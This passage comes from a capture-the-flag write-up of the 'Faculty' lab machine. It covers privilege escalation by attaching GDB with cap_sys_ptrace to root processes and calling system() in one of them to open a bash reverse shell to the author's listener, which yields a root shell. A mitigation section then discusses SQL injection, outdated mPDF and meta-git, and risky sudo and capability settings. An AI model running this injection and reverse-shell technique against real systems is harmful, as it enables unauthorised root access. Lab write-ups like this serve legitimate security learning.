root         934  0.0  0.1   5648  3272 ?        S    18:09   0:00          \_ bash /root/service_check.sh
root        2568  0.0  0.0   4260   576 ?        S    18:28   0:00              \_ sleep 20
...
```

The `service_check.sh` script look really promissing. I used GDB to attach to the process.

```bash
developer@faculty:~$ gdb -p 924
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 924
Reading symbols from /usr/bin/bash...
(No debugging symbols found in /usr/bin/bash)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007f5a32ea1c3a in _start () from /lib64/ld-linux-x86-64.so.2
(gdb)
```

Then I looked for ways to run commands from GDB. I found something to try on [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace).

```bash
(gdb) call (void)system("ls")
No symbol "system" in current context.
```

This failed. I tried a few other things. I tried compiling a library and [loading it in GDB](https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html). This also failed.

I tried [extracting some information from the process memory](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#gdb).

```bash
(gdb) info proc mappings
process 925
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x55739aea1000     0x55739aece000    0x2d000        0x0 /usr/bin/bash
      0x55739aece000     0x55739af7f000    0xb1000    0x2d000 /usr/bin/bash
      0x55739af7f000     0x55739afb6000    0x37000    0xde000 /usr/bin/bash
      0x55739afb6000     0x55739afba000     0x4000   0x114000 /usr/bin/bash
      0x55739afba000     0x55739afc3000     0x9000   0x118000 /usr/bin/bash
      0x55739afc3000     0x55739afcd000     0xa000        0x0
      0x55739b430000     0x55739b451000    0x21000        0x0 [heap]
      0x7f35a6da0000     0x7f35a6dd2000    0x32000        0x0 /usr/lib/locale/C.UTF-8/LC_CTYPE
      0x7f35a6dd2000     0x7f35a6dd3000     0x1000        0x0 /usr/lib/locale/C.UTF-8/LC_NUMERIC

...

(gdb) dump memory heap 0x55739b430000 0x55739b451000
```

I looked through the file I extracted. I did not find any password. The code for the shell script was in there.


```
$ strings heap| less
...

#!/bin/bash
while true
    for serv in cron nginx vmtoolsd
    do
        systemctl status $serv | grep -q "Active: active" || systemctl restart $serv
    done
    sleep 20
done
...
```

But I did not find any way I could exploit it.

I tried for a few hours to exploit this process. I was sure that it was the one I had to exploit.

After a while, I looked for other processes running as root. And I tried back some of the things that failed earlier.

```bash
developer@faculty:~$ ps aux | grep root
...
root         717  0.0  0.8  26896 17988 ?        Ss   01:06   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
...


developer@faculty:~$ gdb -p 717
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 717
Reading symbols from /usr/bin/python3.8...
(No debugging symbols found in /usr/bin/python3.8)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6..
....

(gdb) call (void)system("ls")
[Detaching after vfork from child process 2429]
```

It did not error out this time. I did not get any feedback, but it looked like it worked.

I tried to use it to get a reverse shell.

```bash
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.14.143/4444 0>&1'")
[Detaching after vfork from child process 2489]
```

I got a hit on my netcat listener and the root flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.143] from (UNKNOWN) [10.129.56.83] 33232
bash: cannot set terminal process group (717): Inappropriate ioctl for device
bash: no job control in this shell

root@faculty:/# whoami
whoami
root

root@faculty:/# cat /root/root.txt
cat /root/root.txt
REDACTED
```

## Mitigation

There were a few issues on that box. The first two problems were in the web application.

### SQL Injection

First, the SQL Injection vulnerability. This is the code that extracts the schedule from the database.

```php
function get_schecdule(){
   extract($_POST);
   $data = array();
   $qry = $this->db->query("SELECT * FROM schedules where faculty_id = 0 or faculty_id = $faculty_id");
   while($row=$qry->fetch_assoc()){
      if($row['is_repeating'] == 1){
         $rdata = json_decode($row['repeating_data']);
         foreach($rdata as $k =>$v){
            $row[$k] = $v;
         }
      }
      $data[] = $row;
   }
      return json_encode($data);
}
```

The `$faculty_id` parameter is appended directly to the query. No validation, and no prepared statement. If they were expecting an integer, it would have been easy to validate the parameter and reject everything else. And prepared statements should always be used. 

There is another issue with that code that I saw only after I did the box. The use of [extract](https://www.php.net/extract) on data provided by the user. It could be used to overwrite other values.

All the methods that accessed the database were similar. No validation, the use of `extract` and data appended to the queries.

### Outdated Dependencies

The file that generated that PDF was pretty simple. 

```php
<?php
require('../mpdf/mpdf.php');

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

if (isset($_POST['pdf'])) {
        $html = $_POST['pdf'];
        $html = urldecode(urldecode(base64_decode($html)));
        $mpdf = new mPDF('c');
        $mpdf->WriteHTML($html);
		$fname = "OK" . generateRandomString(24) . ".pdf";
        $mpdf->Output('../mpdf/tmp/'.$fname);
        echo $fname;
}
?>                
```

The HTML should have been regenerated from the courses in the database. And the library needs to be updated since the version used is old and has known vulnerabilities.


The problem with meta-git is similar to mPDF. It uses a version that has a known vulnerability. Version 1.1.2 is installed on the server. This is the vulnerable version, documented in HackerOne.

### Privileges

On top of using an outdated version of meta-git, I was able to use sudo to run it as another user. I can't think of a reason to do that. Changes should be made as yourself. There is no need to run git commands as someone else.

As for GDB, giving the `cap_sys_ptrace` capability is a bad idea. It allows one to attach and inspect any processes, no matter who runs them. This can allow the reading of sensitive data in the process memory. And probably allows injecting shellcode into it.